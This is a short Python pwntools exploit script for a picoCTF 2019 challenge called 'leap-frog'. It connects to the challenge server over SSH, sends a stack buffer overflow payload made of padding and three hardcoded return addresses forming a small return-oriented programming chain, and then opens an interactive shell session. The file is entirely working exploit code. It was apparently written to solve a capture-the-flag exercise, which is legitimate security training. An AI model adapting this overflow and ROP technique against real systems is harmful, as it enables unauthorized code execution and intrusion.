from pwn import *
import sys

# config
context(os="linux", arch="i386")
context.log_level = "debug"

FILE_NAME = ""
HOST = ""
PORT = 0

if len(sys.argv) > 1 and sys.argv[1] == "r":
    conn = remote(HOST, PORT)
else:
    passwd = input().rstrip()
    s = ssh(host="2019shell1.picoctf.com", user="tiki", password=passwd)
    conn = s.process("rop", cwd="/problems/leap-frog_2_b375af7c48bb686629be6dd928a46897")


buflen = 0x18+4
# elf=ELF(FILE_NAME)
# bss=elf.bss()
# printf_plt=elf.plt['printf']
# printf_got=elf.got['printf']
# main_addr=elf.symbols['main']


def main():

    payload = b"A"*buflen
    payload += p32(0x08048430)
    payload += p32(0x080486b3)
    payload += p32(0x0804A03D)
    conn.sendlineafter("> ", payload)
    conn.interactive()


if __name__ == "__main__":
    main()
